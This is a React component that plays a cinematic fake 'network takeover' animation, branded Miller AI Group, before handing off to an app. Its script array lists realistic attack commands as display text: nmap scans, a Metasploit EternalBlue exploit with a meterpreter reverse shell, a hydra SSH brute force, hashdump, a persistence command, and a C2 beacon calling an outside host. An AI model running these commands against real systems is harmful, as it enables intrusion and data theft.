'use client'

import { useState, useEffect, useRef } from 'react'

interface CinematicTakeoverProps {
  onComplete: () => void
  userName?: string
}

export const CHARACTERS: never[] = []

// ASCII art for different phases
const SKULL_ASCII = `
    ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║
    ██║  ██║█████╗  ███████║   ██║   ███████║
    ██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║
    ██████╔╝███████╗██║  ██║   ██║   ██║  ██║
    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
`

const MILLER_ASCII = `
███╗   ███╗██╗██╗     ██╗     ███████╗██████╗
████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗
██╔████╔██║██║██║     ██║     █████╗  ██████╔╝
██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
`

const PWNED_ASCII = `
██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝
`

interface Phase {
  name: string
  duration: number // in lines
  color: string
}

const PHASES: Phase[] = [
  { name: 'SYSTEM BOOT', duration: 8, color: 'text-cyan-400' },
  { name: 'NETWORK RECON', duration: 12, color: 'text-blue-400' },
  { name: 'PORT SCANNING', duration: 10, color: 'text-green-400' },
  { name: 'VULNERABILITY SCAN', duration: 12, color: 'text-yellow-400' },
  { name: 'EXPLOITATION', duration: 15, color: 'text-orange-400' },
  { name: 'PRIVILEGE ESCALATION', duration: 12, color: 'text-red-400' },
  { name: 'PERSISTENCE', duration: 8, color: 'text-purple-400' },
  { name: 'DATA EXFILTRATION', duration: 10, color: 'text-pink-400' },
  { name: 'C2 ESTABLISHMENT', duration: 8, color: 'text-red-500' },
]

export function CinematicTakeover({ onComplete, userName = 'Operator' }: CinematicTakeoverProps) {
  const [lines, setLines] = useState<string[]>([])
  const [showBoot, setShowBoot] = useState(true)
  const [showPwned, setShowPwned] = useState(false)
  const [sessionId, setSessionId] = useState('0000')
  const [timestamp, setTimestamp] = useState('LIVE')
  const [progress, setProgress] = useState(0)
  const [currentPhase, setCurrentPhase] = useState(PHASES[0])
  const [phaseIndex, setPhaseIndex] = useState(0)
  const [glitchActive, setGlitchActive] = useState(false)
  const [matrixRain, setMatrixRain] = useState<string[]>([])
  const [networkMap, setNetworkMap] = useState<string[]>([])
  const [exploitProgress, setExploitProgress] = useState(0)
  const [dataExfil, setDataExfil] = useState({ files: 0, size: 0 })
  const [bootProgress, setBootProgress] = useState(0)
  const containerRef = useRef<HTMLDivElement>(null)
  const scriptStarted = useRef(false)
  const completeTimeout = useRef<NodeJS.Timeout | null>(null)

  // Initialize on mount
  useEffect(() => {
    setSessionId(Date.now().toString(16).toUpperCase())
    setTimestamp(new Date().toISOString())

    // Generate matrix rain characters
    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン'
    const rain: string[] = []
    for (let i = 0; i < 50; i++) {
      let col = ''
      for (let j = 0; j < 30; j++) {
        col += chars[Math.floor(Math.random() * chars.length)]
      }
      rain.push(col)
    }
    setMatrixRain(rain)
  }, [])

  // Boot sequence - FAST
  useEffect(() => {
    if (!showBoot) return

    const bootInterval = setInterval(() => {
      setBootProgress(prev => {
        if (prev >= 100) {
          clearInterval(bootInterval)
          setTimeout(() => setShowBoot(false), 200)
          return 100
        }
        return prev + 5 // Faster increment
      })
    }, 30) // Faster interval

    return () => clearInterval(bootInterval)
  }, [showBoot])

  // Random glitch effect - more frequent for intensity
  useEffect(() => {
    if (showPwned || showBoot) return

    const glitchInterval = setInterval(() => {
      setGlitchActive(true)
      setTimeout(() => setGlitchActive(false), 50 + Math.random() * 80)
    }, 800 + Math.random() * 1200) // More frequent glitches

    return () => clearInterval(glitchInterval)
  }, [showPwned, showBoot])

  // Update time
  useEffect(() => {
    const interval = setInterval(() => {
      setTimestamp(new Date().toISOString())
    }, 1000)
    return () => clearInterval(interval)
  }, [])

  // Run the hack script
  useEffect(() => {
    if (scriptStarted.current || showBoot) return
    scriptStarted.current = true

    const script = [
      // Phase 1: System Boot (8 lines)
      '> MILLER AI GROUP - OFFENSIVE SECURITY FRAMEWORK v2.0',
      '> Kernel loaded: Linux kali 6.1.0-kali9-amd64',
      '> Initializing attack modules...',
      '[+] Loaded: reconnaissance.so',
      '[+] Loaded: exploitation.so',
      '[+] Loaded: persistence.so',
      '[+] Loaded: exfiltration.so',
      '[*] All systems operational. Starting breach...',

      // Phase 2: Network Recon (12 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 1: NETWORK RECONNAISSANCE',
      '════════════════════════════════════════════════════',
      '$ whois target.corp | grep -i range',
      '[+] Network range: 10.0.0.0/24',
      '$ host -t mx target.corp',
      '[+] Mail server: mail.target.corp (10.0.0.25)',
      '$ dig @8.8.8.8 target.corp ANY',
      '[+] DNS records enumerated: 14 entries',
      '[+] Subdomains discovered: api, dev, staging, admin',
      '[*] Network topology mapped successfully',

      // Phase 3: Port Scanning (10 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 2: PORT SCANNING & SERVICE ENUMERATION',
      '════════════════════════════════════════════════════',
      '$ nmap -sS -sV -O -A 10.0.0.0/24 --top-ports 1000',
      '[+] 10.0.0.1   - Cisco IOS (Gateway)',
      '[+] 10.0.0.10  - Windows Server 2019 (DC)',
      '[+] 10.0.0.15  - Ubuntu 22.04 (Web)',
      '[+] 10.0.0.20  - CentOS 8 (Database)',
      '[+] Open ports: 22, 80, 443, 445, 3306, 3389, 8080',

      // Phase 4: Vulnerability Scan (12 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 3: VULNERABILITY ASSESSMENT',
      '════════════════════════════════════════════════════',
      '$ nuclei -l targets.txt -t cves/ -severity critical,high',
      '[!] CRITICAL: CVE-2024-1709 - ConnectWise ScreenConnect',
      '[!] CRITICAL: CVE-2023-46747 - F5 BIG-IP RCE',
      '[!] HIGH: CVE-2023-44487 - HTTP/2 Rapid Reset',
      '[!] HIGH: CVE-2023-22515 - Atlassian Confluence',
      '$ searchsploit "Windows Server 2019"',
      '[+] 47 exploits found',
      '[*] Vulnerability assessment complete. 23 HIGH/CRITICAL',

      // Phase 5: Exploitation (15 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 4: EXPLOITATION',
      '════════════════════════════════════════════════════',
      '$ msfconsole -q',
      'msf6 > use exploit/windows/smb/ms17_010_eternalblue',
      'msf6 > set RHOSTS 10.0.0.10',
      'msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp',
      'msf6 > set LHOST 10.0.0.99',
      '[*] Started reverse TCP handler on 10.0.0.99:4444',
      '[*] Sending exploit packet...',
      '[*] Exploit completed, waiting for session...',
      '[+] Meterpreter session 1 opened (10.0.0.99:4444 -> 10.0.0.10:49157)',
      '$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.15',
      '[+] SSH login found: admin:Summer2024!',

      // Phase 6: Privilege Escalation (12 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 5: PRIVILEGE ESCALATION',
      '════════════════════════════════════════════════════',
      'meterpreter > getuid',
      '[+] Server username: TARGET\\webadmin',
      'meterpreter > getsystem',
      '[+] ...got system via technique 1 (Named Pipe Impersonation)',
      'meterpreter > hashdump',
      '[+] Administrator:500:aad3b435b51404ee:8846f7eaee8fb117...',
      '[+] ' + userName.toLowerCase() + ':1001:aad3b435b51404ee:7c3e2f1...',
      '[*] Dumped 47 password hashes',

      // Phase 7: Persistence (8 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 6: ESTABLISHING PERSISTENCE',
      '════════════════════════════════════════════════════',
      'meterpreter > run persistence -X -i 60 -p 443 -r 10.0.0.99',
      '[*] Creating startup registry key...',
      '[+] Persistent agent installed',
      '[+] Golden ticket created for domain persistence',

      // Phase 8: Data Exfiltration (10 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 7: DATA EXFILTRATION',
      '════════════════════════════════════════════════════',
      '$ find /home -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf"',
      '[+] Found 1,247 sensitive documents',
      '$ mysqldump -u root -p target_db > dump.sql',
      '[+] Database exported: 2.4GB',
      '[*] Encrypting and staging data for exfil...',
      '[+] Data exfiltrated via DNS tunneling: 3.2GB',

      // Phase 9: C2 Establishment (8 lines)
      '',
      '════════════════════════════════════════════════════',
      '  PHASE 8: C2 ESTABLISHMENT',
      '════════════════════════════════════════════════════',
      '$ ./c2-beacon --server miller-ai.group --protocol https',
      '[+] C2 beacon initialized',
      '[+] Heartbeat established: every 60s',
      '[+] Awaiting operator commands...',

      // Final
      '',
      '████████████████████████████████████████████████████',
      '[!] ████  BREACH COMPLETE  ████',
      '[!] TARGET NETWORK FULLY COMPROMISED',
      '[!] CONTROLLED BY: MILLER AI GROUP',
      '████████████████████████████████████████████████████',
    ]

    let lineIndex = 0
    let currentPhaseIdx = 0
    let linesInPhase = 0

    const addLine = () => {
      if (lineIndex < script.length) {
        const newLine = script[lineIndex]
        if (newLine !== undefined) {
          setLines(prev => [...prev, newLine])
        }

        // Update progress
        setProgress(Math.floor((lineIndex / script.length) * 100))

        // Track phase changes
        linesInPhase++
        if (currentPhaseIdx < PHASES.length - 1 && linesInPhase >= PHASES[currentPhaseIdx].duration) {
          currentPhaseIdx++
          setPhaseIndex(currentPhaseIdx)
          setCurrentPhase(PHASES[currentPhaseIdx])
          linesInPhase = 0
        }

        // Update side panel data
        if (newLine?.includes('10.0.0')) {
          setNetworkMap(prev => [...prev.slice(-6), newLine.substring(4, 50)])
        }
        if (newLine?.includes('Meterpreter') || newLine?.includes('session')) {
          setExploitProgress(prev => Math.min(prev + 25, 100))
        }
        if (newLine?.includes('exfil') || newLine?.includes('Found')) {
          setDataExfil(prev => ({
            files: prev.files + Math.floor(Math.random() * 200),
            size: prev.size + Math.random() * 500
          }))
        }

        lineIndex++

        if (containerRef.current) {
          containerRef.current.scrollTop = containerRef.current.scrollHeight
        }

        // Trigger glitch on important lines
        if (newLine?.includes('[!]') || newLine?.includes('████') || newLine?.includes('PHASE')) {
          setGlitchActive(true)
          setTimeout(() => setGlitchActive(false), 100)
        }

        // FAST variable timing - quick but readable
        let delay = 25
        if (newLine === '') delay = 80 // Brief pause for sections
        else if (newLine?.startsWith('════')) delay = 40
        else if (newLine?.startsWith('[!]')) delay = 60 // Slight emphasis on warnings
        else if (newLine?.startsWith('$') || newLine?.startsWith('msf')) delay = 50 // Commands slightly slower
        else if (newLine?.startsWith('[+]')) delay = 30 // Success messages fast
        else if (newLine?.includes('PHASE')) delay = 100 // Pause on phase headers
        else delay = 20 + Math.random() * 15 // Fast base speed

        setTimeout(addLine, delay)
      } else {
        setProgress(100)
        setCurrentPhase({ name: 'COMPLETE', duration: 0, color: 'text-red-500' })
        setTimeout(() => {
          setShowPwned(true)
          completeTimeout.current = setTimeout(() => {
            onComplete()
          }, 3500) // Faster transition to app
        }, 500) // Quick transition to PWNED
      }
    }

    setTimeout(addLine, 300) // Start faster

    return () => {
      if (completeTimeout.current) {
        clearTimeout(completeTimeout.current)
      }
    }
  }, [userName, onComplete, showBoot])

  const getLineColor = (line: string | undefined): string => {
    if (!line) return 'text-green-600'
    if (line.startsWith('>')) return 'text-cyan-400'
    if (line.startsWith('$') || line.startsWith('msf')) return 'text-green-400 font-semibold'
    if (line.startsWith('[+]')) return 'text-green-500'
    if (line.startsWith('[*]')) return 'text-blue-400'
    if (line.startsWith('[!]')) return 'text-red-500 font-bold'
    if (line.startsWith('════')) return 'text-cyan-500'
    if (line.startsWith('███') || line.startsWith('████')) return 'text-red-500'
    if (line.includes('meterpreter') || line.includes('Meterpreter')) return 'text-purple-400'
    if (line.includes('PHASE')) return 'text-yellow-400 font-bold'
    if (line.includes('COMPROMISED') || line.includes('COMPLETE')) return 'text-red-500 font-bold animate-pulse'
    return 'text-green-600/90'
  }

  // Boot screen
  if (showBoot) {
    return (
      <div className="fixed inset-0 bg-black z-50 font-mono flex flex-col items-center justify-center overflow-hidden">
        {/* Matrix rain background - simplified */}
        <div className="absolute inset-0 overflow-hidden opacity-30">
          {Array.from({ length: 20 }).map((_, i) => (
            <div
              key={i}
              className="absolute text-green-500 text-xs leading-none whitespace-pre"
              style={{
                left: `${i * 5}%`,
                top: 0,
                height: '100%',
                writingMode: 'vertical-rl',
                textOrientation: 'upright',
                opacity: 0.3 + Math.random() * 0.4,
              }}
            >
              {matrixRain[i % matrixRain.length]?.substring(0, 20)}
            </div>
          ))}
        </div>


        {/* Boot content */}
        <div className="relative z-10 text-center px-4 w-full max-w-lg">
          <pre className="text-green-500 text-[6px] xs:text-[8px] sm:text-xs mb-6 sm:mb-8 leading-tight overflow-hidden" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>
            {MILLER_ASCII}
          </pre>

          <div className="text-green-400 text-xs sm:text-sm mb-4">
            [ OFFENSIVE SECURITY FRAMEWORK ]
          </div>

          <div className="w-full max-w-xs sm:max-w-sm h-2 sm:h-3 bg-green-900/30 border border-green-700/50 mx-auto mb-4 overflow-hidden">
            <div
              className="h-full bg-green-500 transition-all duration-100"
              style={{ width: `${bootProgress}%`, boxShadow: '0 0 10px rgba(0,255,0,0.8)' }}
            />
          </div>

          <div className="text-green-600 text-[10px] sm:text-xs space-y-1">
            <p>{bootProgress < 20 && '> Loading kernel modules...'}</p>
            <p>{bootProgress >= 20 && bootProgress < 40 && '> Initializing network stack...'}</p>
            <p>{bootProgress >= 40 && bootProgress < 60 && '> Loading exploit database...'}</p>
            <p>{bootProgress >= 60 && bootProgress < 80 && '> Establishing secure tunnel...'}</p>
            <p>{bootProgress >= 80 && bootProgress < 100 && '> Preparing attack vectors...'}</p>
            <p>{bootProgress >= 100 && '> SYSTEM READY'}</p>
          </div>

          <div className="text-green-700 text-[10px] sm:text-xs mt-4 sm:mt-6">
            v2.0.0 | Build 2024.12.28
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 bg-black z-50 font-mono overflow-hidden">
      {/* Glitch overlay */}
      {glitchActive && (
        <div className="absolute inset-0 z-50 pointer-events-none">
          <div className="absolute inset-0 bg-red-500/10" />
          <div className="absolute top-1/3 left-0 right-0 h-1 bg-cyan-500/50" style={{ transform: `translateX(${Math.random() * 20 - 10}px)` }} />
          <div className="absolute top-2/3 left-0 right-0 h-0.5 bg-red-500/50" style={{ transform: `translateX(${Math.random() * 20 - 10}px)` }} />
          <div className="absolute inset-0" style={{
            background: `repeating-linear-gradient(0deg, transparent 0px, transparent ${Math.random() * 3 + 1}px, rgba(255,0,0,0.03) ${Math.random() * 3 + 1}px, rgba(255,0,0,0.03) ${Math.random() * 6 + 2}px)`
          }} />
        </div>
      )}

      {/* HACK PHASE */}
      <div className={`absolute inset-0 transition-opacity duration-500 ${showPwned ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
        {/* CRT scanlines */}
        <div
          className="absolute inset-0 pointer-events-none z-10 opacity-20"
          style={{
            background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
          }}
        />

        {/* Top HUD */}
        <div className="absolute top-0 left-0 right-0 p-3 flex items-center justify-between border-b border-green-900/50 bg-black/90 z-20">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              <span className="text-red-500 text-xs font-bold tracking-wider">● LIVE BREACH</span>
            </div>
            <div className="text-green-600 text-xs hidden sm:block">
              SESSION: {sessionId}
            </div>
          </div>
          <div className="flex items-center gap-4 text-xs">
            <span className="text-green-500 hidden md:block">{timestamp}</span>
            <span className="text-yellow-500">OPERATOR: {userName}</span>
          </div>
        </div>

        {/* Side panel - Attack info */}
        <div className="absolute top-16 right-4 w-56 text-xs z-20 space-y-3 hidden lg:block">
          {/* Phase indicator */}
          <div className="border border-green-900/50 bg-black/90 p-3">
            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ ATTACK PHASE ]</div>
            <div className={`${currentPhase.color} font-bold animate-pulse`}>{currentPhase.name}</div>
            <div className="mt-2 flex gap-1">
              {PHASES.map((_, i) => (
                <div
                  key={i}
                  className={`h-1 flex-1 ${i <= phaseIndex ? 'bg-green-500' : 'bg-green-900/50'}`}
                />
              ))}
            </div>
          </div>

          {/* Progress */}
          <div className="border border-green-900/50 bg-black/90 p-3">
            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ BREACH PROGRESS ]</div>
            <div className="h-3 bg-green-900/30 overflow-hidden border border-green-700/30">
              <div
                className="h-full bg-gradient-to-r from-green-600 to-green-400 transition-all duration-300"
                style={{ width: `${progress}%`, boxShadow: '0 0 10px rgba(0,255,0,0.5)' }}
              />
            </div>
            <div className="text-green-400 text-right mt-1 font-bold">{progress}%</div>
          </div>

          {/* Network map */}
          <div className="border border-green-900/50 bg-black/90 p-3">
            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ COMPROMISED HOSTS ]</div>
            <div className="space-y-1 text-[10px]">
              {networkMap.slice(-4).map((host, i) => (
                <div key={i} className="text-green-400 truncate">{host}</div>
              ))}
              {networkMap.length === 0 && <div className="text-green-700">Scanning...</div>}
            </div>
          </div>

          {/* Exploit status */}
          <div className="border border-green-900/50 bg-black/90 p-3">
            <div className="text-green-500 mb-2 font-bold text-[10px] tracking-widest">[ EXPLOIT STATUS ]</div>
            <div className="grid grid-cols-2 gap-2 text-[10px]">
              <div>
                <div className="text-green-700">Sessions</div>
                <div className="text-green-400 font-bold">{Math.floor(exploitProgress / 25)}</div>
              </div>
              <div>
                <div className="text-green-700">Shells</div>
                <div className="text-purple-400 font-bold">{Math.floor(exploitProgress / 50)}</div>
              </div>
              <div>
                <div className="text-green-700">Files</div>
                <div className="text-cyan-400 font-bold">{dataExfil.files}</div>
              </div>
              <div>
                <div className="text-green-700">Exfil</div>
                <div className="text-pink-400 font-bold">{dataExfil.size.toFixed(1)}MB</div>
              </div>
            </div>
          </div>
        </div>

        {/* Main terminal */}
        <div className="h-full flex flex-col pt-14 pb-20 lg:pb-12">
          <div className="flex-1 flex">
            {/* Left margin */}
            <div className="w-4 md:w-12 flex-shrink-0" />

            {/* Terminal content */}
            <div className="flex-1 flex flex-col p-4 max-w-4xl">
              {/* Terminal header */}
              <div className="flex items-center gap-2 mb-3 text-xs border-b border-green-900/30 pb-2">
                <div className="flex gap-1.5">
                  <div className="w-3 h-3 rounded-full bg-red-500" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500" />
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                </div>
                <span className="text-green-600">root@kali</span>
                <span className="text-green-500">:</span>
                <span className="text-blue-400">~/miller-ai/exploit</span>
                <span className="text-green-500">#</span>
              </div>

              {/* Terminal output */}
              <div
                ref={containerRef}
                className="flex-1 overflow-y-auto text-xs sm:text-sm leading-relaxed pr-4 lg:pr-60"
                style={{ scrollbarWidth: 'thin', scrollbarColor: '#166534 #000' }}
              >
                {lines.filter(line => line !== undefined).map((line, i) => (
                  <div
                    key={i}
                    className={`${getLineColor(line)} ${line?.startsWith('[!]') ? 'text-base' : ''} ${line?.startsWith('════') ? 'my-2' : ''}`}
                  >
                    {line || '\u00A0'}
                  </div>
                ))}
                <span className="text-green-500 animate-pulse">█</span>
              </div>
            </div>

            {/* Right margin for side panel */}
            <div className="w-4 lg:w-64 flex-shrink-0" />
          </div>
        </div>

        {/* Mobile progress bar - only visible on small screens */}
        <div className="absolute bottom-12 left-0 right-0 px-4 lg:hidden z-20">
          <div className="flex items-center gap-2 mb-1">
            <span className={`text-[10px] ${currentPhase.color} font-bold`}>{currentPhase.name}</span>
            <span className="text-green-500 text-[10px] ml-auto">{progress}%</span>
          </div>
          <div className="h-1.5 bg-green-900/30 overflow-hidden border border-green-700/30">
            <div
              className="h-full bg-gradient-to-r from-green-600 to-green-400 transition-all duration-300"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>

        {/* Bottom status bar */}
        <div className="absolute bottom-0 left-0 right-0 p-2 flex items-center justify-between border-t border-green-900/50 bg-black/90 z-20 text-[10px]">
          <div className="flex items-center gap-2 sm:gap-4 text-green-600">
            <span className="hidden xs:inline">TARGET: 10.0.0.0/24</span>
            <span className="xs:hidden">10.0.0.0/24</span>
            <span className="hidden sm:inline">PROTOCOL: MULTI</span>
          </div>
          <div className="flex items-center gap-2 sm:gap-4">
            <span className="text-green-500 hidden sm:inline">PACKETS: {Math.floor(progress * 247)}</span>
            <span className="text-green-500">LINES: {lines.length}</span>
          </div>
        </div>
      </div>

      {/* PWNED PHASE */}
      <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-700 ${showPwned ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
        {/* Red scanlines */}
        <div
          className="absolute inset-0 pointer-events-none opacity-20"
          style={{
            background: 'repeating-linear-gradient(0deg, transparent 0px, transparent 3px, rgba(255,0,0,0.1) 3px, rgba(255,0,0,0.1) 6px)',
          }}
        />

        {/* Animated glitch lines */}
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          {[8, 18, 32, 47, 63, 78, 92].map((top, i) => (
            <div
              key={i}
              className="absolute left-0 right-0 h-px bg-red-500/40 animate-pulse"
              style={{ top: `${top}%`, animationDelay: `${i * 0.15}s` }}
            />
          ))}
        </div>

        {/* Vignette */}
        <div
          className="absolute inset-0 pointer-events-none"
          style={{ background: 'radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.95) 100%)' }}
        />

        {/* Content */}
        <div className="relative z-10 text-center px-4">
          {/* PWNED ASCII */}
          <pre
            className="text-red-500 text-[5px] xs:text-[7px] sm:text-xs md:text-sm mb-4 font-bold leading-none"
            style={{ textShadow: '0 0 30px rgba(255,0,0,0.8), 0 0 60px rgba(255,0,0,0.4)' }}
          >
            {PWNED_ASCII}
          </pre>

          <h1
            className="text-3xl xs:text-4xl sm:text-5xl md:text-7xl font-black text-red-500 mb-3 sm:mb-4 tracking-wider sm:tracking-widest animate-pulse"
            style={{ textShadow: '0 0 50px rgba(255,0,0,0.7), 0 0 100px rgba(255,0,0,0.4), 4px 4px 0 #000' }}
          >
            SYSTEM OWNED
          </h1>

          <div className="h-px w-48 sm:w-64 mx-auto bg-gradient-to-r from-transparent via-red-500 to-transparent mb-4 sm:mb-6" />

          <pre
            className="text-green-500 text-[4px] xs:text-[5px] sm:text-[8px] mb-3 sm:mb-4 leading-none hidden xs:block"
            style={{ textShadow: '0 0 15px rgba(0,255,0,0.6)' }}
          >
            {MILLER_ASCII}
          </pre>

          <div
            className="text-green-400 text-lg xs:text-xl sm:text-2xl md:text-3xl font-bold mb-2 tracking-[0.1em] sm:tracking-[0.2em]"
            style={{ textShadow: '0 0 20px rgba(0,255,0,0.6)' }}
          >
            ACCESS GRANTED
          </div>

          <div className="text-green-600 text-sm sm:text-base mb-4 sm:mb-6">
            Welcome, <span className="text-green-400 font-bold">{userName}</span>
          </div>

          <div className="text-green-500 text-xs sm:text-sm font-mono mb-6 sm:mb-8">
            root@miller-ai:~# <span className="animate-pulse">█</span>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-2 sm:flex sm:flex-wrap justify-center gap-2 sm:gap-4 md:gap-8 text-center">
            <div className="border border-green-900/50 px-3 sm:px-4 py-2 bg-black/50">
              <div className="text-green-400 text-xl sm:text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>24</div>
              <div className="text-green-700 text-[8px] sm:text-[10px] uppercase tracking-widest">Hosts</div>
            </div>
            <div className="border border-green-900/50 px-3 sm:px-4 py-2 bg-black/50">
              <div className="text-green-400 text-xl sm:text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>ROOT</div>
              <div className="text-green-700 text-[8px] sm:text-[10px] uppercase tracking-widest">Access</div>
            </div>
            <div className="border border-green-900/50 px-3 sm:px-4 py-2 bg-black/50">
              <div className="text-green-400 text-xl sm:text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>1.2K</div>
              <div className="text-green-700 text-[8px] sm:text-[10px] uppercase tracking-widest">Creds</div>
            </div>
            <div className="border border-green-900/50 px-3 sm:px-4 py-2 bg-black/50">
              <div className="text-green-400 text-xl sm:text-2xl font-bold" style={{ textShadow: '0 0 10px rgba(0,255,0,0.5)' }}>3.2GB</div>
              <div className="text-green-700 text-[8px] sm:text-[10px] uppercase tracking-widest">Exfil</div>
            </div>
          </div>
        </div>

        {/* Corner elements */}
        <div className="absolute top-4 left-4 text-red-500 text-xs font-bold animate-pulse">● REC</div>
        <div className="absolute top-4 right-4 text-green-600 text-xs font-mono">{timestamp}</div>
        <div className="absolute bottom-4 left-4 text-green-800 text-xs font-mono">SESSION: {sessionId}</div>
        <div className="absolute bottom-4 right-4 text-green-800 text-xs font-mono">MILLER-AI v2.0</div>
      </div>
    </div>
  )
}

export type { CinematicTakeoverProps }
